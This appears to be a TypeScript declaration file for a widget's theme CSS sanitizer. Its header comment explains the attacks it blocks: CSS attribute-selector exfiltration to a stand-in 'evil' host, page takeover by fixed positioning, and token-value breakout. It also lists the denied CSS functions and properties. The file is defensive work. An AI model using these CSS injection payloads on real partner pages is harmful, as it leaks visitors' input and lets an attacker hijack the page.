/**
 * Theme CSS safety (2026-11 audit).
 *
 * Quest themes are written by qaid project members and served by qaid's
 * server, and this embed draws them on partner sites. A theme may restyle the
 * quest card; it must not reach the partner page or its visitors. Three holes
 * this closes:
 *
 *  1. Exfiltration. `[value^="a"] { background: url(https://evil/?a) }` sends
 *     what a visitor picks to someone else's server, and any `url()` is a
 *     tracking pixel on every page view.
 *  2. Page takeover. `:host { position: fixed; inset: 0 }` covers the whole
 *     partner page with something that looks like it.
 *  3. Breakout. A token value of `red; } :host { ... ` ends the token block
 *     and starts rules of its own.
 *
 * qaid.dev applies the SAME rules when a theme is saved; keep the two lists in
 * step. They are explicit on purpose, so both sides can be read side by side.
 *
 * TOKEN VALUES (theme `tokens`, and host `colors` / `fontFamily`) are dropped
 * unless they are a plain CSS value. A value is refused if it contains any of:
 *   - the characters  ;  {  }  <  >  \
 *   - the text  url(  image-set(  image(  cross-fade(  src(  expression(
 *     @import  /*  javascript:   (any case)
 *   - unbalanced quotes, parentheses or brackets
 * A token NAME must be a custom property: --[A-Za-z0-9_-]+
 *
 * THEME CSS (theme `css`) is parsed and rebuilt, so its braces always balance
 * and it cannot swallow the layers after it. While rebuilding, this is dropped:
 *   - comments, and every  -->  and every  <  followed by a letter, / ! or ?
 *     (so no  </style  <script  <!--  survives; `width < 600px` does)
 *   - every @import, @charset and @namespace rule
 *   - a declaration whose property is  behavior  or  -moz-binding
 *   - a declaration whose value has  url(  (except url(#id), a same-document
 *     SVG reference),  image-set(  -webkit-image-set(  image(  cross-fade(
 *     src(  expression(  or  javascript:
 *   - a declaration  position: fixed  or  position: sticky
 * CSS escapes (\75 rl, u\72l) are decoded before any check, so an escaped
 * word is caught like a plain one.
 *
 * The host page's own `css` option is the partner's code and is not filtered.
 */
/** True when `value` is a plain CSS value safe to drop into a declaration. */
export declare function isSafeTokenValue(value: unknown): value is string;
export declare function isSafeTokenName(name: string): boolean;
/** The theme's tokens as a `:where(.qaid-q-root) { ... }` block, unsafe ones dropped. */
export declare function tokensToCss(tokens: Record<string, unknown> | null | undefined): string;
/** Rebuild a theme's custom CSS with every unsafe part removed. */
export declare function sanitizeThemeCss(css: unknown): string;
export declare function installThemeCss(root: ShadowRoot, css: string): void;
/** The theme stylesheets this module installed in `root` (for tests and teardown). */
export declare function themeSheetsIn(root: ShadowRoot): CSSStyleSheet[];
/** The theme CSS installed in `root` as text, or null when none was. */
export declare function themeCssText(root: ShadowRoot): string | null;
